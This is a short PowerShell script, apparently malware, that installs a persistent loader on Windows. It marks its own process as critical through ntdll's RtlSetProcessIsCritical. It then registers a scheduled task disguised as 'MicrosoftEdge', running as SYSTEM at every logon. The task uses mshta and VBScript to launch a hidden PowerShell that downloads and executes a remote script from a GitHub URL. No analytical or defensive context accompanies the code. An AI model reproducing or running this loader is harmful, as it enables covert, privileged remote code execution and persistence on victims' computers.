# Import hàm native để đánh dấu Critical
$code = @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcess
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
}
"@
Add-Type -AssemblyName System.Console
Add-Type -TypeDefinition $code

# Đánh dấu process là Critical
[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
$task_name = "MicrosoftEdge"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
Stop-Process -Id $PID -Force


